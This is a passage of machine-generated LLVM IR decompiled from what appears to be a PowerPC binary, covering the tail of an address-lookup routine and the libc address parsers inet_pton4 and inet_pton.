  %v0_1001d744.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d734

dec_label_pc_1001d704:                            ; preds = %dec_label_pc_1001d6ec
  %v0_1001d704 = load i32, i32* %r21.global-to-local, align 4
  %v3_1001d704 = icmp eq i32 %v0_1001d704, 0
  store i1 %v3_1001d704, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d70c = load i32, i32* %r23.global-to-local, align 4
  br i1 %v3_1001d704, label %dec_label_pc_1001d70c, label %dec_label_pc_1001d718

dec_label_pc_1001d70c:                            ; preds = %dec_label_pc_1001d704
  %v3_1001d70c = icmp eq i32 %v0_1001d70c, 0
  store i1 %v3_1001d70c, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  br i1 %v3_1001d70c, label %dec_label_pc_1001d734, label %dec_label_pc_1001d718

dec_label_pc_1001d718:                            ; preds = %dec_label_pc_1001d704, %dec_label_pc_1001d70c
  %v3_1001d718 = icmp eq i32 %v0_1001d70c, 0
  store i1 %v3_1001d718, i1* %cr7_eq.global-to-local, align 1
  %v1_1001d71c = call i32 @__asm_rlwinm(i32 %v0_1001d70c, i32 0, i32 24, i32 22)
  %v1_1001d720 = sub i32 0, %v1_1001d71c
  store i32 %v1_1001d720, i32* %r3.global-to-local, align 4
  %v0_1001d724 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001d724, label %dec_label_pc_1001d728, label %dec_label_pc_1001d734

dec_label_pc_1001d728:                            ; preds = %dec_label_pc_1001d718, %dec_label_pc_1001d540, %dec_label_pc_1001d4c0
  store i32 -2, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d734

dec_label_pc_1001d730:                            ; preds = %dec_label_pc_1001d4e4, %dec_label_pc_1001d4fc
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d734

dec_label_pc_1001d734:                            ; preds = %dec_label_pc_1001d718, %dec_label_pc_1001d70c, %dec_label_pc_1001d6e0, %dec_label_pc_1001d568, %dec_label_pc_1001d728, %dec_label_pc_1001d6f8, %dec_label_pc_1001d6a4, %dec_label_pc_1001d730
  %v0_1001d744 = phi i32 [ %v1_1001d720, %dec_label_pc_1001d718 ], [ 0, %dec_label_pc_1001d70c ], [ -6, %dec_label_pc_1001d6e0 ], [ -8, %dec_label_pc_1001d568 ], [ -2, %dec_label_pc_1001d728 ], [ %v0_1001d744.pre, %dec_label_pc_1001d6f8 ], [ %v1_1001d6a8, %dec_label_pc_1001d6a4 ], [ -1, %dec_label_pc_1001d730 ]
  ret i32 %v0_1001d744

; uselistorder directives
  uselistorder i32 %v0_1001d70c, { 1, 0, 2 }
  uselistorder i1 %v0_1001d6e0, { 1, 0 }
  uselistorder i32 %v2_1001d6c0, { 1, 0 }
  uselistorder i1 %v0_1001d628, { 1, 0 }
  uselistorder i32 %v0_1001d5d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1001d5d4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1001d55c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1001d504, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r28.global-to-local, { 0, 3, 4, 5, 2, 1, 6 }
  uselistorder i32* %r23.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r22.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r21.global-to-local, { 1, 0, 2, 3 }
  uselistorder i1* %cr7_eq.global-to-local, { 3, 4, 5, 6, 7, 8, 21, 2, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 1, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 (i32)* @freeaddrinfo, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1001d734, { 7, 4, 0, 1, 5, 2, 6, 3 }
  uselistorder label %dec_label_pc_1001d730, { 1, 0 }
  uselistorder label %dec_label_pc_1001d718, { 1, 0 }
  uselistorder label %dec_label_pc_1001d6d0, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d6cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001d6bc, { 1, 0 }
  uselistorder label %dec_label_pc_1001d6a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001d694, { 1, 0 }
  uselistorder label %dec_label_pc_1001d650, { 1, 0 }
  uselistorder label %dec_label_pc_1001d628, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d624, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d5ac, { 1, 0 }
  uselistorder label %dec_label_pc_1001d584, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d578, { 1, 0 }
  uselistorder label %dec_label_pc_1001d4e4, { 1, 0 }
  uselistorder label %dec_label_pc_1001d4c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d49c, { 1, 0, 2 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %cr1_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr6_gt.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001d748 = load i32, i32* @lr, align 4
  store i32 %v0_1001d748, i32* %r0.global-to-local, align 4
  %v0_1001d750 = call i32 @__asm_mfcr()
  store i32 %v0_1001d750, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  %v2_1001d75c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1001d75c, i32* %r7.global-to-local, align 4
  %v0_1001d760 = load i32, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1001d7c8

dec_label_pc_1001d778:                            ; preds = %dec_label_pc_1001d7c8
  %v3_1001d778 = icmp eq i32 %v0_1001d7ec, 4
  store i1 %v3_1001d778, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d77c = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_1001d77c, label %dec_label_pc_1001d7b4, label %dec_label_pc_1001d780

dec_label_pc_1001d780:                            ; preds = %dec_label_pc_1001d778
  %v0_1001d780 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001d780 = inttoptr i32 %v0_1001d780 to i8*
  %v2_1001d780 = load i8, i8* %v1_1001d780, align 1
  %v3_1001d780 = zext i8 %v2_1001d780 to i32
  %v1_1001d784 = mul nuw nsw i32 %v3_1001d780, 10
  %v1_1001d788 = load i32, i32* %r11.global-to-local, align 4
  %v2_1001d788 = add i32 %v1_1001d784, %v1_1001d788
  %v1_1001d78c = add i32 %v2_1001d788, -48
  store i32 %v1_1001d78c, i32* %r0.global-to-local, align 4
  %v2_1001d790 = icmp ugt i32 %v1_1001d78c, 255
  %v3_1001d790 = icmp eq i32 %v1_1001d78c, 255
  store i1 %v3_1001d790, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001d790, label %dec_label_pc_1001d810, label %dec_label_pc_1001d798

dec_label_pc_1001d798:                            ; preds = %dec_label_pc_1001d780
  %v1_1001d798 = trunc i32 %v1_1001d78c to i8
  store i8 %v1_1001d798, i8* %v1_1001d780, align 1
  %v0_1001d79c = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1001d79c, label %dec_label_pc_1001d7a0, label %dec_label_pc_1001d7c8.backedge

dec_label_pc_1001d7a0:                            ; preds = %dec_label_pc_1001d798
  %v0_1001d7a0 = load i32, i32* @r10, align 4
  %v1_1001d7a0 = add i32 %v0_1001d7a0, 1
  store i32 %v1_1001d7a0, i32* @r10, align 4
  store i32 1, i32* @r8, align 4
  %v2_1001d7a8 = icmp sgt i32 %v1_1001d7a0, 4
  %v3_1001d7a8 = icmp eq i32 %v1_1001d7a0, 4
  store i1 %v3_1001d7a8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001d7a8, label %dec_label_pc_1001d810, label %dec_label_pc_1001d7c8.backedge

dec_label_pc_1001d7b4:                            ; preds = %dec_label_pc_1001d778
  store i32 0, i32* @r8, align 4
  %v0_1001d7b8 = load i1, i1* %cr1_eq.global-to-local, align 1
  %v0_1001d7b8.not = xor i1 %v0_1001d7b8, true
  %v0_1001d7bc = load i1, i1* %cr4_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1001d778, %v0_1001d7bc
  %or.cond = or i1 %brmerge, %v0_1001d7b8.not
  br i1 %or.cond, label %dec_label_pc_1001d810, label %dec_label_pc_1001d7c4

dec_label_pc_1001d7c4:                            ; preds = %dec_label_pc_1001d7b4
  %v0_1001d7c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_1001d7c4 = trunc i32 %v0_1001d7c4 to i8
  %v2_1001d7c4 = load i32, i32* %r7.global-to-local, align 4
  %v3_1001d7c4 = add i32 %v2_1001d7c4, 1
  %v4_1001d7c4 = inttoptr i32 %v3_1001d7c4 to i8*
  store i8 %v1_1001d7c4, i8* %v4_1001d7c4, align 1
  store i32 %v3_1001d7c4, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001d7c8.backedge

dec_label_pc_1001d7c8.backedge:                   ; preds = %dec_label_pc_1001d7c4, %dec_label_pc_1001d798, %dec_label_pc_1001d7a0
  %v0_1001d7c8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1001d7cc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001d7c8

dec_label_pc_1001d7c8:                            ; preds = %dec_label_pc_1001d7c8.backedge, %entry
  %v0_1001d7cc = phi i32 [ %v0_1001d7cc.pre, %dec_label_pc_1001d7c8.backedge ], [ 0, %entry ]
  %v0_1001d7d0 = phi i32 [ %v0_1001d7c8.pre, %dec_label_pc_1001d7c8.backedge ], [ %v0_1001d750, %entry ]
  %v1_1001d7c8 = inttoptr i32 %v0_1001d7d0 to i8*
  %v2_1001d7c8 = load i8, i8* %v1_1001d7c8, align 1
  %v3_1001d7c8 = zext i8 %v2_1001d7c8 to i32
  store i32 %v3_1001d7c8, i32* %r11.global-to-local, align 4
  %v3_1001d7cc = icmp eq i32 %v0_1001d7cc, 0
  store i1 %v3_1001d7cc, i1* %cr4_eq.global-to-local, align 1
  %v1_1001d7d0 = add i32 %v0_1001d7d0, 1
  store i32 %v1_1001d7d0, i32* %r3.global-to-local, align 4
  %v3_1001d7d4 = icmp eq i8 %v2_1001d7c8, 0
  store i1 %v3_1001d7d4, i1* %cr7_eq.global-to-local, align 1
  %v1_1001d7d8 = add nsw i32 %v3_1001d7c8, -48
  store i32 %v1_1001d7d8, i32* %r0.global-to-local, align 4
  %v2_1001d7dc = icmp ugt i32 %v1_1001d7d8, 9
  store i1 %v2_1001d7dc, i1* %cr6_gt.global-to-local, align 1
  %v3_1001d7e0 = icmp eq i8 %v2_1001d7c8, 46
  store i1 %v3_1001d7e0, i1* %cr1_eq.global-to-local, align 1
  %v0_1001d7e4 = load i4, i4* @cr4, align 1
  %v1_1001d7e4 = call %3 @__asm_mcrf_cr0_write(i4 %v0_1001d7e4)
  %v4_1001d7e4 = extractvalue %3 %v1_1001d7e4, 2
  store i1 %v4_1001d7e4, i1* %cr0_eq.global-to-local, align 1
  %v0_1001d7e8 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v0_1001d7ec = load i32, i32* @r10, align 4
  br i1 %v0_1001d7e8, label %dec_label_pc_1001d7ec, label %dec_label_pc_1001d778

dec_label_pc_1001d7ec:                            ; preds = %dec_label_pc_1001d7c8
  %v3_1001d7ec = icmp eq i32 %v0_1001d7ec, 3
  store i1 %v3_1001d7ec, i1* %cr7_eq.global-to-local, align 1
  %tmp9 = icmp slt i32 %v0_1001d7ec, 4
  br i1 %tmp9, label %dec_label_pc_1001d810, label %dec_label_pc_1001d7f4

dec_label_pc_1001d7f4:                            ; preds = %dec_label_pc_1001d7ec
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1001d75c, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001d804.1196 to i32), i32* @lr, align 4
  %v0_1001d800 = call i32 @memcpy()
  br label %dec_label_pc_1001d810

dec_label_pc_1001d810:                            ; preds = %dec_label_pc_1001d7b4, %dec_label_pc_1001d780, %dec_label_pc_1001d7a0, %dec_label_pc_1001d7ec, %dec_label_pc_1001d7f4
  %storemerge = phi i32 [ 1, %dec_label_pc_1001d7f4 ], [ 0, %dec_label_pc_1001d7ec ], [ 0, %dec_label_pc_1001d7a0 ], [ 0, %dec_label_pc_1001d780 ], [ 0, %dec_label_pc_1001d7b4 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i32 %v0_1001d760, i32* %r0.global-to-local, align 4
  %v1_1001d820 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001d750)
  %v4_1001d820 = extractvalue %0 %v1_1001d820, 2
  store i1 %v4_1001d820, i1* %cr0_eq.global-to-local, align 1
  %v9_1001d820 = extractvalue %0 %v1_1001d820, 7
  store i4 %v9_1001d820, i4* @cr4, align 1
  %v0_1001d824 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001d824

; uselistorder directives
  uselistorder i32 %v1_1001d7a0, { 1, 0, 2 }
  uselistorder i32 %v1_1001d78c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1001d750, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i1* %cr7_eq.global-to-local, { 0, 4, 5, 1, 2, 3 }
  uselistorder i1* %cr6_gt.global-to-local, { 1, 0 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr1_eq.global-to-local, { 1, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d810, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d7c8.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_1001d828 = icmp eq i32 %arg1, 2
  %v0_1001d82c = load i32, i32* @lr, align 4
  store i32 %v0_1001d82c, i32* %r0.global-to-local, align 4
  %v0_1001d838 = load i32, i32* @r4, align 4
  store i32 %v0_1001d838, i32* @r29, align 4
  %v0_1001d840 = load i32, i32* @r5, align 4
  store i32 %v0_1001d840, i32* @r22, align 4
  br i1 %v3_1001d828, label %dec_label_pc_1001d854, label %dec_label_pc_1001d848

dec_label_pc_1001d848:                            ; preds = %entry
  %v3_1001d848 = icmp eq i32 %arg1, 10
  br i1 %v3_1001d848, label %dec_label_pc_1001d868, label %dec_label_pc_1001da04

dec_label_pc_1001d854:                            ; preds = %entry
  store i32 %v0_1001d838, i32* %r3.global-to-local, align 4
  store i32 268556384, i32* @lr, align 4
  %v2_1001d85c = call i32 @inet_pton4(i32 %v0_1001d838, i32 %v0_1001d840)
  store i32 %v2_1001d85c, i32* %r3.global-to-local, align 4
  store i32 %v2_1001d85c, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da1c

dec_label_pc_1001d868:                            ; preds = %dec_label_pc_1001d848
  %v2_1001d868 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001d868, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268556408, i32* @lr, align 4
  %v0_1001d874 = call i32 @__GI_memset()
  store i32 %v0_1001d874, i32* %r3.global-to-local, align 4
  %v0_1001d878 = load i32, i32* @r29, align 4
  %v1_1001d878 = inttoptr i32 %v0_1001d878 to i8*
  %v2_1001d878 = load i8, i8* %v1_1001d878, align 1
  %v3_1001d878 = zext i8 %v2_1001d878 to i32
  store i32 %v3_1001d878, i32* %r0.global-to-local, align 4
  store i32 %v0_1001d874, i32* @r31, align 4
  %v2_1001d880 = add i32 %v0_1001d874, 16
  store i32 %v2_1001d880, i32* @r27, align 4
  %v3_1001d884 = icmp eq i8 %v2_1001d878, 58
  br i1 %v3_1001d884, label %dec_label_pc_1001d88c, label %dec_label_pc_1001d898

dec_label_pc_1001d88c:                            ; preds = %dec_label_pc_1001d868
  %v1_1001d88c = add i32 %v0_1001d878, 1
  %v2_1001d88c = inttoptr i32 %v1_1001d88c to i8*
  %v3_1001d88c = load i8, i8* %v2_1001d88c, align 1
  %v4_1001d88c = zext i8 %v3_1001d88c to i32
  store i32 %v4_1001d88c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001d88c, i32* @r29, align 4
  %v3_1001d890 = icmp eq i8 %v3_1001d88c, 58
  br i1 %v3_1001d890, label %dec_label_pc_1001d898, label %dec_label_pc_1001da18

dec_label_pc_1001d898:                            ; preds = %dec_label_pc_1001d88c, %dec_label_pc_1001d868
  %v0_1001d898 = phi i32 [ %v1_1001d88c, %dec_label_pc_1001d88c ], [ %v0_1001d878, %dec_label_pc_1001d868 ]
  store i32 %v0_1001d898, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001d96c2935 = inttoptr i32 %v0_1001d898 to i8*
  %v2_1001d96c3036 = load i8, i8* %v1_1001d96c2935, align 1
  %v3_1001d96c3137 = zext i8 %v2_1001d96c3036 to i32
  store i32 %v3_1001d96c3137, i32* %r3.global-to-local, align 4
  store i32 268556660, i32* @lr, align 4
  %v1_1001d9703238 = call i32 @__GI_tolower(i32 %v3_1001d96c3137)
  store i32 %v1_1001d9703238, i32* %r3.global-to-local, align 4
  store i32 %v1_1001d9703238, i32* @r30, align 4
  %v3_1001d9743339 = icmp eq i32 %v1_1001d9703238, 0
  br i1 %v3_1001d9743339, label %dec_label_pc_1001d97c, label %dec_label_pc_1001d8a4.lr.ph

dec_label_pc_1001d8a4:                            ; preds = %dec_label_pc_1001d8a4.lr.ph, %dec_label_pc_1001d96c.backedge
  %v1_1001d97034 = phi i32 [ %v1_1001d9703240, %dec_label_pc_1001d8a4.lr.ph ], [ %v1_1001d970, %dec_label_pc_1001d96c.backedge ]
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1002f06c.1197 to i32), i32* @r25, align 4
  %v0_1001d8b0 = load i32, i32* @r29, align 4
  %v1_1001d8b0 = add i32 %v0_1001d8b0, 1
  store i32 %v1_1001d8b0, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1002f06c.1197 to i32), i32* @r3, align 4
  store i32 268556476, i32* @lr, align 4
  %v3_1001d8b8 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1002f06c.1197 to i32), i32 %v1_1001d97034)
  store i32 %v3_1001d8b8, i32* %r3.global-to-local, align 4
  %v3_1001d8bc = icmp eq i32 %v3_1001d8b8, 0
  br i1 %v3_1001d8bc, label %dec_label_pc_1001d8dc, label %dec_label_pc_1001d8c4

dec_label_pc_1001d8c4:                            ; preds = %dec_label_pc_1001d8a4
  %v0_1001d8c4 = load i32, i32* @r25, align 4
  %v2_1001d8c4 = sub i32 %v3_1001d8b8, %v0_1001d8c4
  store i32 %v2_1001d8c4, i32* %r0.global-to-local, align 4
  %v0_1001d8c8 = load i32, i32* @r28, align 4
  %v1_1001d8c8 = mul i32 %v0_1001d8c8, 16
  store i32 %v1_1001d8c8, i32* %r9.global-to-local, align 4
  %v2_1001d8cc = or i32 %v1_1001d8c8, %v2_1001d8c4
  store i32 %v2_1001d8cc, i32* @r28, align 4
  %tmp18 = icmp ult i32 %v2_1001d8cc, 65536
  br i1 %tmp18, label %dec_label_pc_1001d968, label %dec_label_pc_1001da18

dec_label_pc_1001d8dc:                            ; preds = %dec_label_pc_1001d8a4
  %v0_1001d8dc = load i32, i32* @r30, align 4
  %v3_1001d8dc = icmp eq i32 %v0_1001d8dc, 58
  br i1 %v3_1001d8dc, label %dec_label_pc_1001d8e4, label %dec_label_pc_1001d938

dec_label_pc_1001d8e4:                            ; preds = %dec_label_pc_1001d8dc
  %v0_1001d8e4 = load i32, i32* @r23, align 4
  %v3_1001d8e4 = icmp eq i32 %v0_1001d8e4, 0
  br i1 %v3_1001d8e4, label %dec_label_pc_1001d8ec, label %dec_label_pc_1001d900

dec_label_pc_1001d8ec:                            ; preds = %dec_label_pc_1001d8e4
  %v0_1001d8ec = load i32, i32* @r24, align 4
  %v3_1001d8ec = icmp eq i32 %v0_1001d8ec, 0
  br i1 %v3_1001d8ec, label %dec_label_pc_1001d8f4, label %dec_label_pc_1001da18

dec_label_pc_1001d8f4:                            ; preds = %dec_label_pc_1001d8ec
  %v0_1001d8f4 = load i32, i32* @r31, align 4
  store i32 %v0_1001d8f4, i32* @r24, align 4
  %v0_1001d8f8 = load i32, i32* @r29, align 4
  store i32 %v0_1001d8f8, i32* @r26, align 4
  br label %dec_label_pc_1001d96c.backedge

dec_label_pc_1001d900:                            ; preds = %dec_label_pc_1001d8e4
  %v0_1001d900 = load i32, i32* @r29, align 4
  %v1_1001d900 = inttoptr i32 %v0_1001d900 to i8*
  %v2_1001d900 = load i8, i8* %v1_1001d900, align 1
  %v3_1001d900 = zext i8 %v2_1001d900 to i32
  store i32 %v3_1001d900, i32* %r0.global-to-local, align 4
  %v3_1001d904 = icmp eq i8 %v2_1001d900, 0
  br i1 %v3_1001d904, label %dec_label_pc_1001da18, label %dec_label_pc_1001d90c

dec_label_pc_1001d90c:                            ; preds = %dec_label_pc_1001d900
  %v0_1001d90c = load i32, i32* @r31, align 4
  %v1_1001d90c = add i32 %v0_1001d90c, 2
  store i32 %v1_1001d90c, i32* %r0.global-to-local, align 4
  %v1_1001d910 = load i32, i32* @r27, align 4
  %v3_1001d910 = icmp ugt i32 %v1_1001d90c, %v1_1001d910
  br i1 %v3_1001d910, label %dec_label_pc_1001da18, label %dec_label_pc_1001d918

dec_label_pc_1001d918:                            ; preds = %dec_label_pc_1001d90c
  %v0_1001d918 = load i32, i32* @r28, align 4
  %v1_1001d918 = udiv i32 %v0_1001d918, 256
  store i32 %v1_1001d918, i32* %r0.global-to-local, align 4
  %v1_1001d91c = trunc i32 %v0_1001d918 to i8
  %v3_1001d91c = add i32 %v0_1001d90c, 1
  %v4_1001d91c = inttoptr i32 %v3_1001d91c to i8*
  store i8 %v1_1001d91c, i8* %v4_1001d91c, align 1
  %v0_1001d920 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d920 = trunc i32 %v0_1001d920 to i8
  %v2_1001d920 = load i32, i32* @r31, align 4
  %v3_1001d920 = inttoptr i32 %v2_1001d920 to i8*
  store i8 %v1_1001d920, i8* %v3_1001d920, align 1
  %v0_1001d924 = load i32, i32* @r29, align 4
  store i32 %v0_1001d924, i32* @r26, align 4
  %v0_1001d928 = load i32, i32* @r31, align 4
  %v1_1001d928 = add i32 %v0_1001d928, 2
  store i32 %v1_1001d928, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001d96c29 = inttoptr i32 %v0_1001d924 to i8*
  %v2_1001d96c30 = load i8, i8* %v1_1001d96c29, align 1
  %v3_1001d96c31 = zext i8 %v2_1001d96c30 to i32
  store i32 %v3_1001d96c31, i32* %r3.global-to-local, align 4
  store i32 268556660, i32* @lr, align 4
  %v1_1001d97032 = call i32 @__GI_tolower(i32 %v3_1001d96c31)
  store i32 %v1_1001d97032, i32* %r3.global-to-local, align 4
  store i32 %v1_1001d97032, i32* @r30, align 4
  %v3_1001d97433 = icmp eq i32 %v1_1001d97032, 0
  br i1 %v3_1001d97433, label %dec_label_pc_1001d97c, label %dec_label_pc_1001d8a4.lr.ph

dec_label_pc_1001d8a4.lr.ph:                      ; preds = %dec_label_pc_1001d898, %dec_label_pc_1001d918
  %v1_1001d9703240 = phi i32 [ %v1_1001d97032, %dec_label_pc_1001d918 ], [ %v1_1001d9703238, %dec_label_pc_1001d898 ]
  br label %dec_label_pc_1001d8a4

dec_label_pc_1001d938:                            ; preds = %dec_label_pc_1001d8dc
  %v3_1001d938 = icmp eq i32 %v0_1001d8dc, 46
  br i1 %v3_1001d938, label %dec_label_pc_1001d940, label %dec_label_pc_1001da18

dec_label_pc_1001d940:                            ; preds = %dec_label_pc_1001d938
  %v0_1001d940 = load i32, i32* @r31, align 4
  %v1_1001d940 = add i32 %v0_1001d940, 4
  store i32 %v1_1001d940, i32* @r30, align 4
  %v1_1001d944 = load i32, i32* @r27, align 4
  %v3_1001d944 = icmp ugt i32 %v1_1001d940, %v1_1001d944
  br i1 %v3_1001d944, label %dec_label_pc_1001da18, label %dec_label_pc_1001d94c

dec_label_pc_1001d94c:                            ; preds = %dec_label_pc_1001d940
  %v0_1001d950 = load i32, i32* @r26, align 4
  store i32 %v0_1001d950, i32* %r3.global-to-local, align 4
  store i32 268556632, i32* @lr, align 4
  %v2_1001d954 = call i32 @inet_pton4(i32 %v0_1001d950, i32 %v0_1001d940)
  store i32 %v2_1001d954, i32* %r3.global-to-local, align 4
  %v0_1001d958 = load i32, i32* @r30, align 4
  store i32 %v0_1001d958, i32* @r31, align 4
  %v2_1001d95c = icmp sgt i32 %v2_1001d954, 0
  br i1 %v2_1001d95c, label %dec_label_pc_1001d9a0, label %dec_label_pc_1001da18

dec_label_pc_1001d968:                            ; preds = %dec_label_pc_1001d8c4
  store i32 1, i32* @r23, align 4
  %v0_1001d96c.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001d96c.backedge

dec_label_pc_1001d96c.backedge:                   ; preds = %dec_label_pc_1001d968, %dec_label_pc_1001d8f4
  %v0_1001d96c.be = phi i32 [ %v0_1001d96c.pre.pre, %dec_label_pc_1001d968 ], [ %v0_1001d8f8, %dec_label_pc_1001d8f4 ]
  %v1_1001d96c = inttoptr i32 %v0_1001d96c.be to i8*
  %v2_1001d96c = load i8, i8* %v1_1001d96c, align 1
  %v3_1001d96c = zext i8 %v2_1001d96c to i32
  store i32 %v3_1001d96c, i32* %r3.global-to-local, align 4
  store i32 268556660, i32* @lr, align 4
  %v1_1001d970 = call i32 @__GI_tolower(i32 %v3_1001d96c)
  store i32 %v1_1001d970, i32* %r3.global-to-local, align 4
  store i32 %v1_1001d970, i32* @r30, align 4
  %v3_1001d974 = icmp eq i32 %v1_1001d970, 0
  br i1 %v3_1001d974, label %dec_label_pc_1001d97c, label %dec_label_pc_1001d8a4

dec_label_pc_1001d97c:                            ; preds = %dec_label_pc_1001d96c.backedge, %dec_label_pc_1001d898, %dec_label_pc_1001d918
  %v0_1001d97c = load i32, i32* @r23, align 4
  %v3_1001d97c = icmp eq i32 %v0_1001d97c, 0
  %v0_1001d9e4.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1001d97c, label %dec_label_pc_1001d9a0, label %dec_label_pc_1001d984

dec_label_pc_1001d984:                            ; preds = %dec_label_pc_1001d97c
  %v1_1001d984 = add i32 %v0_1001d9e4.pre.pre, 2
  store i32 %v1_1001d984, i32* %r0.global-to-local, align 4
  %v1_1001d988 = load i32, i32* @r27, align 4
  %v3_1001d988 = icmp ugt i32 %v1_1001d984, %v1_1001d988
  br i1 %v3_1001d988, label %dec_label_pc_1001da18, label %dec_label_pc_1001d990

dec_label_pc_1001d990:                            ; preds = %dec_label_pc_1001d984
  %v0_1001d990 = load i32, i32* @r28, align 4
  %v1_1001d990 = udiv i32 %v0_1001d990, 256
  store i32 %v1_1001d990, i32* %r0.global-to-local, align 4
  %v1_1001d994 = trunc i32 %v0_1001d990 to i8
  %v3_1001d994 = add i32 %v0_1001d9e4.pre.pre, 1
  %v4_1001d994 = inttoptr i32 %v3_1001d994 to i8*
  store i8 %v1_1001d994, i8* %v4_1001d994, align 1
  %v0_1001d998 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d998 = trunc i32 %v0_1001d998 to i8
  %v2_1001d998 = load i32, i32* @r31, align 4
  %v3_1001d998 = inttoptr i32 %v2_1001d998 to i8*
  store i8 %v1_1001d998, i8* %v3_1001d998, align 1
  %v0_1001d99c = load i32, i32* @r31, align 4
  %v1_1001d99c = add i32 %v0_1001d99c, 2
  store i32 %v1_1001d99c, i32* @r31, align 4
  br label %dec_label_pc_1001d9a0

dec_label_pc_1001d9a0:                            ; preds = %dec_label_pc_1001d97c, %dec_label_pc_1001d94c, %dec_label_pc_1001d990
  %v0_1001d9e4.pre = phi i32 [ %v0_1001d958, %dec_label_pc_1001d94c ], [ %v1_1001d99c, %dec_label_pc_1001d990 ], [ %v0_1001d9e4.pre.pre, %dec_label_pc_1001d97c ]
  %v0_1001d9a0 = load i32, i32* @r24, align 4
